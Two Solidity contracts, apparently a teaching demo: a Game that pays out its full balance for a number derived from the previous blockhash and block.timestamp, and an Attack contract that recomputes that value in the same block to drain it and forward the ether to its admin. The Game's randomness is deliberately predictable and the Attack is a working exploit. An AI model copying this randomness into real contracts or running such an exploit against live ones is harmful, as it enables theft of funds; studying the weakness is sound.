// SPDX-License-Identifier:MIT
pragma solidity ^0.8.9;

import "./Game.sol";    

contract Attack {
    address payable private admin;
    Game public game;

    constructor(address _gameAddress){
        game = Game(_gameAddress);
        admin = payable(msg.sender);
    }

    receive() external payable{}

    function getEther() public{
        require(msg.sender == admin,'Only admin can withdraw');
        admin.transfer(address(this).balance);
    }

    function attack() public{
        uint guess = uint(
                keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp))
            );
        game.guessTheNumber(guess);
    }

    function checkBalance() view public returns(uint){
        return address(this).balance;
    }
    
}

// SPDX-License-Identifier:MIT
pragma solidity ^0.8.9;

contract Game {
    constructor () payable{}

    function guessTheNumber(uint _num) public{
        uint answer = uint(
                keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp))
            );
        if(_num == answer){
            uint amount = address(this).balance;
            (bool sent,) = msg.sender.call{value:amount}("");
            require(sent,"Failed to transfer the winnings.");
        }
    }

    function deposit() public payable {}

    function getBalances() view public returns(uint){
        return address(this).balance;
    }
}